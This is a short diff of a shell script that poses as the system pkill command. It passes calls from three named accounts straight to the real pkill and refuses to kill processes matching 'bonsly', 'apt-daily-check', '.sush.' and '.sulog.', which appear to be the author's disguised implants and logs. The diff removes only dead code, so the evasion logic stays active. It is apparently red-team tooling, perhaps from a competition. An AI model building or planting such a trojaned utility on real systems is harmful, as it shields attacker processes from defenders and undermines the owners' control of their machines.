@@ -6,7 +6,6 @@ case "$(whoami)" in
     kingneptune|paintythepirate|greyteamadmin) exec $REAL_PKILL "$@" ;;
 esac
 
-
 # Block pkill targeting bonsly or our scripts by name pattern
 BLOCKED_PATTERNS=("bonsly" "apt-daily-check" "\.sush\." "\.sulog\.")
 
@@ -19,8 +18,3 @@ for arg in "$@"; do
 done
 
 exec $REAL_PKILL "$@"
-
-# Pass straight through if running under Ansible
-if [ -n "$ANSIBLE_REMOTE_TEMP" ]; then
-    exec $REAL_PKILL "$@"
-fi
